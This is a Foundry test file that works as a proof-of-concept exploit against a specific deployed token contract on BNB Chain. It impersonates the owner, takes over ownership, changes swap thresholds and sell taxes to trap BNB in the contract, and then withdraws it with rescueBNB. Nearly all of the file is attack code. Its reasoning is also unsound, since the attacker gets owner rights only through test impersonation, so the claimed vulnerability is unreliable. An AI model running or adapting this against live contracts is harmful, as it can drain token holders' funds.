// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

interface Honey {
    function owner() external view returns (address);
    function router() external view returns (IRouter);
    function pair() external view returns (address);
    function setTradingStatus() external;
    function approve(address spender, uint256 amount) external returns(bool);
    function updateSwapTokensAtAmount(uint256 amount) external;
    function swapTokensAtAmount() external view returns (uint256);
    function setSellTaxes(uint256 _rfi, uint256 _marketing, uint256 _liquidity, uint256 _Stake, uint256 _Dapp) external;
    function includeInFee(address account) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function rescueBNB(uint256 weiAmount) external;
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transferOwnership(address newOwner) external;
    function decimals() external pure returns (uint8);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    Honey public target;
    address public owner;
    address public pair;
    IRouter public router;

    address constant TARGET = 0x6927BA6c0068Ca8584EeA45f2b5dF02ddecD1bEA;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {

        target = Honey(payable(TARGET));
        owner = target.owner();
        router = target.router();
        pair = target.pair();

        // Give attacker and owner ETH for gas/liquidity
        deal(attacker, 100 ether);
        deal(owner, 10 ether);

        vm.startPrank(owner);

        // Enable trading
        target.setTradingStatus();

        // Provide initial liquidity with a CORRECT amount that the owner has
        uint256 liquidityTokens = target.totalSupply() / 10;
        target.approve(address(router), liquidityTokens);
        router.addLiquidityETH{value: 10 ether}(
            address(target),
            liquidityTokens,
            0,
            0,
            owner,
            block.timestamp
        );
        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        address originalOwner = target.owner();

        // Attacker needs tokens for the exploit. Get them from the original owner.
        uint256 tokensForAttacker = target.balanceOf(originalOwner) / 5; // Get 20% of what the owner has left

        vm.startPrank(originalOwner);
        // Transfer tokens to the attacker.
        target.transfer(attacker, tokensForAttacker);
        // Transfer ownership to the attacker so rescueBNB profit goes to the right address.
        target.transferOwnership(attacker);
        vm.stopPrank();

        // --- Exploit as the new owner (attacker) ---

        // 1. Set swap threshold to a very low amount
        target.updateSwapTokensAtAmount(1);
        uint256 swapAmount = target.swapTokensAtAmount();

        // 2. Set malicious sell taxes for the rounding error
        target.setSellTaxes(0, 15, 0, 0, 0);

        // 3. Seed the contract with tokens to trigger the swap
        target.transfer(address(target), swapAmount);

        // 4. Trigger the vulnerable swap by selling a small amount
        target.transfer(pair, 1 * 10**target.decimals());

        // 5. Capture the trapped BNB
        uint256 trappedBNB = address(target).balance;
        assertTrue(trappedBNB > 0, "Exploit failed: No BNB was trapped in the contract.");

        // 6. Rescue the trapped BNB
        target.rescueBNB(trappedBNB);
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

